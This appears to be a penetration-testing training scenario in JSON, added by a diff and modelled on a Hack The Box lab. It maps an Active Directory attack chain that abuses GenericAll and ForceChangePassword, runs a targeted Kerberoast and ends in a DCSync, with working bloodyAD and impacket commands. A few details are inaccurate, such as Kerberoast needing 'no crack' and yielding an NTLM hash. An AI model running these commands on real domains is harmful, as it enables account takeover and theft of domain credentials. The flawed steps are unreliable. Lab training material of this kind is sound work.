@@ -1,0 +1,141 @@
+{
+  "id": "ad-permission-gauntlet",
+  "title": "AD Permission Gauntlet",
+  "category": "ad-chain",
+  "source": ["HTB Administrator"],
+  "designed_by": "lab-derived",
+  "description": "GenericAll → ForceChangePassword → Password Safe → Targeted Kerberoast → DCSync. Pure BloodHound-driven chain.",
+  "introduction": "Teaches AD permission abuse without exploits: GenericAll, ForceChangePassword, GenericWrite on SPN. BloodHound reveals the path; bloodyAD executes it. No RCE needed—just LDAP.",
+  "mental_model": "AD objects have permissions. GenericAll = full control; ForceChangePassword = set password; GenericWrite on user = add SPN for Kerberoast. Chain permission → new cred → next permission.",
+  "key_principles": [
+    "BloodHound/SharpHound map permission paths to DA",
+    "GenericAll or ForceChangePassword lets you set a known password",
+    "Password Safe = LDAP cred store; bloodyAD get object retrieves it",
+    "GenericWrite on user + add SPN = Targeted Kerberoast (no crack needed)",
+    "DCSync with DA hash dumps entire domain credential database"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 7,
+    "enumeration_depth": 3,
+    "rabbit_hole_risk": 2,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0004","TA0005","TA0006","TA0007"],
+    "techniques": [
+      {"id":"T1087.002","name":"Domain Account"},
+      {"id":"T1484.001","name":"Group Policy Modification"},
+      {"id":"T1558.003","name":"Kerberoasting"},
+      {"id":"T1003.006","name":"DCSync"},
+      {"id":"T1098","name":"Account Manipulation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T3-NonWeb-Access","T5-Credentials","T6-Pivoting","T7-Lateral"],
+
+  "environment": {
+    "machine_count": 1,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "genericall","forcechangepassword","password-safe","targeted-kerberoast","dcsync","bloodhound",
+    "bloodyad","impacket","evil-winrm","sharpview","powerview","rubeus","hashcat"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [16,17,18,19],
+    "pattern_frequency": "medium",
+    "recommended_order": 5
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id":"internal","cidr":"10.10.11.0/24","label":"AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id":"dc01",
+      "label":"DC01",
+      "ip":"10.10.11.42",
+      "os":"Windows Server 2022",
+      "role":"Domain Controller",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"given-creds","summary":"Evil-WinRM with olivia given creds","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.42 -u olivia -p '<given_password>'"]
+        },
+        {
+          "port":445,
+          "name":"SMB",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SMB with domain creds for enumeration","leads_to":"bloodhound-data"}
+          ],
+          "commands":["crackmapexec smb 10.10.11.42 -u olivia -p '<password>' --shares"]
+        },
+        {
+          "port":389,
+          "name":"LDAP",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"LDAP enumeration with domain creds","leads_to":"bloodhound-data"}
+          ],
+          "commands":["bloodyAD -d domain.local -u olivia -p '<password>' --host 10.10.11.42 get object michael --attr msDS-AllowedToActOnBehalfOfOtherIdentity"]
+        },
+        {
+          "port":88,
+          "name":"Kerberos",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"targeted-kerberoast","summary":"Targeted Kerberoast after GenericWrite on ethan SPN","leads_to":"domain-admin"}
+          ],
+          "commands":["impacket-GetUserSPNs domain.local/emily -dc-ip 10.10.11.42 -request -target-user ethan -outputfile ethan.hash"]
+        }
+      ],
+      "privesc":[],
+      "credentials":[
+        {"user":"olivia","type":"password","source":"given","unlocks":["dc01-initial"]},
+        {"user":"michael","type":"password","source":"GenericAll → ForceChangePassword via bloodyAD","unlocks":["michael-context"]},
+        {"user":"benjamin","type":"password","source":"michael has ForceChangePassword on benjamin","unlocks":["benjamin-context"]},
+        {"user":"emily","type":"password","source":"benjamin → Password Safe (bloodyAD get object)","unlocks":["emily-context"]},
+        {"user":"ethan","type":"ntlm-hash","source":"GenericWrite on ethan → add SPN → Targeted Kerberoast","unlocks":["dc01"]}
+      ],
+      "alternatives":[
+        {"source":"bloodhound","description":"SharpHound collection for full graph","commands":["SharpHound.exe -c All -d domain.local"]},
+        {"source":"bloodyAD","description":"ForceChangePassword via bloodyAD","commands":["bloodyAD -d domain.local -u olivia -p '<password>' --host 10.10.11.42 set password michael 'NewPassword123!' --new-password"]},
+        {"source":"bloodyAD","description":"Add SPN for Targeted Kerberoast","commands":["bloodyAD -d domain.local -u emily -p '<password>' --host 10.10.11.42 add spn ethan 'ops/whatever'"]},
+        {"source":"impacket","description":"DCSync with ethan DA hash","commands":["impacket-secretsdump domain.local/ethan@10.10.11.42 -hashes :<ntlm_hash>"]}
+      ]
+    }
+  ],
+
+  "connections":[],
+
+  "attack_paths":[
+    {
+      "id":"path-ad-permission-chain",
+      "name":"AD Permission Chain (Primary)",
+      "color":"#6bb8cc",
+      "steps":["dc01"],
+      "description":"olivia (given) → GenericAll michael → ForceChangePassword → michael → ForceChangePassword benjamin → benjamin → Password Safe → emily → GenericWrite ethan (SPN) → Targeted Kerberoast ethan → ethan is DA → DCSync"
+    }
+  ]
+}
